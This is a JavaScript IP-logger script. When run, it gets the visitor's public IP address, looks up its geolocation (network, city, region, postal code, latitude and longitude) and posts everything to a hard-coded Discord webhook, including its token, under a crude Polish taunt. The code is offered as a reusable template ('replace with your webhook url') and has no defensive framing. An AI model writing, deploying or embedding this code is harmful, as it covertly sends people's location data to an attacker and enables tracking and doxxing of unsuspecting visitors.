const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1469813377411846156/zASg85mu_dxYNa4Mxf52R8ntTv_HowVYtvEeCbZnhkyxH3JaavLO2H5JOHcNqz7i9avV'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Protektor Bomba", // optionally changeable
                            avatar_url: "https://media.discordapp.net/attachments/824956684509380678/1465799196757197038/5FBE12AF-EAB4-4E8F-A3AA-11016282C6E1.png?ex=69981521&is=6996c3a1&hm=1213a257e0b782dbb1dabc6e4a91ed586328a959cb5e42a7cfc0b15e276077d5&=&format=webp&quality=lossless", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'Jakas kurwa dala nam swuj adres ip!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
